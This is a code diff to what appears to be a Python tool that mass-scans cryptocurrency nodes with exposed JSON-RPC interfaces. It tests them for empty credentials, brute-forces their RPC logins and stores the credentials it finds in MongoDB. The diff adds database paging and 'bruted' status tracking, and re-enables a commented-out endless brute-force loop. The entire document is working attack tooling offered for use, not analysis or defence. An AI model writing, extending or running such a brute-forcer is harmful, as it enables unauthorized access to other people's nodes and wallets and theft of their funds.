@@ -1,8 +1,8 @@
 # -*- coding: utf-8 -*-
-import re
 import time
 import asyncio
 import linecache
+import itertools
 
 from collections import namedtuple
 from operator import itemgetter
@@ -37,11 +37,12 @@ class BruterBase:
             for document in docs
         )
 
-    def get_peers_from_db(self, limit):
+    def get_peers_from_db(self, skip, limit):
         documents = self.mongo_jsonrpc.find_many(
             data={'jsonrpc': {'$gt': 0}, 'bruted': False},
             collection=self.coin_name,
             limit=limit,
+            skip=skip,
             to_list=False
         )
 
@@ -50,10 +51,12 @@ class BruterBase:
     @staticmethod
     def _get_data_from_file(data, start, end):
         start = 1 if start == 0 else start
-        return (
+        data_block = (
             utils.clear_string(linecache.getline(data, line))
             for line in range(start, end)
         )
+
+        return filter(lambda x: x != '', data_block)
 
     def _get_data_block_by_point(self, data, point):
         start, end = point, point + self.num_threads
@@ -61,14 +64,15 @@ class BruterBase:
         if isinstance(data, str):
             genexpr = self._get_data_from_file(data, start, end)
         else:
-            genexpr = self.get_peers_from_db(end)
+            genexpr = self.get_peers_from_db(start, end)
 
         return genexpr
 
-    def _get_peer_from_db(self):
+    def _get_peer_from_db(self, point):
         params = {
             'data': {'jsonrpc': {'$gt': 0}, 'bruted': False},
             'collection': self.coin_name,
+            'skip': point
         }
 
         document = self.mongo_jsonrpc.find_one(**params)
@@ -84,7 +88,7 @@ class BruterBase:
         if isinstance(data, str):
             return self._get_single_data_from_file(data, point + 1)
         else:
-            return self._get_peer_from_db()
+            return self._get_peer_from_db(point)
 
     @property
     def _sorted_brute_order_data(self):
@@ -136,16 +140,23 @@ class EmptyCredentialsChecker(BruterBase):
         self.async_mongo_jsonrpc = AIOMotor(db_name='jsonrpc', uri=kwargs.get('mongo_uri'))
 
     @staticmethod
-    async def _get_host_from_uri(uri):
-        pattern = re.compile(r'http://(\d+\.){3}\d+')
-        return re.search(pattern, uri).group()
+    async def _get_peer_and_port_from_uri(uri):
+        prefix, host, port = uri.split(':')
+        return f'{prefix}:{host}', int(port)
 
-    async def _update_brute_status(self, peer, status):
+    async def _update_brute_status(self, uri, status):
+        peer, jsonrpc = await self._get_peer_and_port_from_uri(uri)
+
         await self.async_mongo_jsonrpc.update_one(
-            find_data={'peer': await self._get_host_from_uri(peer)},
+            find_data={'peer': peer, 'jsonrpc': jsonrpc, 'bruted': False},
             update_data={'bruted': status},
             collection=self.coin_name
         )
+
+    async def update_brute_status_handler(self, brute_data):
+        index = self.brute_order.index('H')
+        uris = set(map(lambda x: x[index], brute_data))
+        [await self._update_brute_status(uri, 'NotBruted') for uri in uris]
 
     async def _make_record(self, **kwargs):
         await self.async_mongo_creds.insert_one(
@@ -201,7 +212,7 @@ class EmptyCredentialsChecker(BruterBase):
 
     async def _run_check_empty_by_block(self, grams):
         for point in range(0, self._peers_count, self.num_threads):
-            non_checked_peers = self.get_peers_from_db(self.num_threads)
+            non_checked_peers = self.get_peers_from_db(point, self.num_threads)
             await self._checker_handler(non_checked_peers, grams)
 
         return True
@@ -238,19 +249,22 @@ class JSONRPCBruter(EmptyCredentialsChecker):
         )
 
     async def _run_bruteforce_by_block(self, grams):
-        for *args, rng in self.brute_data:
+        brute_data, brute_data_cp = itertools.tee(self.brute_data)
+
+        for *args, rng in brute_data:
             await self._bruteforce_handler(args, rng=rng, grams=grams)
+
+        await self.update_brute_status_handler(brute_data_cp)
 
     async def run_bruteforce(self):
         while True:
             await self.check_peers_with_empty_creds()
-            # grams = [GramBitcoin(session_required=True) for _ in range(self.num_threads)]
-            #
-            # try:
-            #     await self._run_bruteforce_by_block(grams)
-            # except (bitcoinerrors.NoConnectionToTheDaemon, asyncio.futures.TimeoutError):
-            #     continue
-            # finally:
-            #     await self.close_gram_sessions(grams)
-            #     time.sleep(self._cycle_timeout)
-            break
+            grams = [GramBitcoin(session_required=True) for _ in range(self.num_threads)]
+
+            try:
+                await self._run_bruteforce_by_block(grams)
+            except (bitcoinerrors.NoConnectionToTheDaemon, asyncio.futures.TimeoutError):
+                continue
+            finally:
+                await self.close_gram_sessions(grams)
+                time.sleep(self._cycle_timeout)
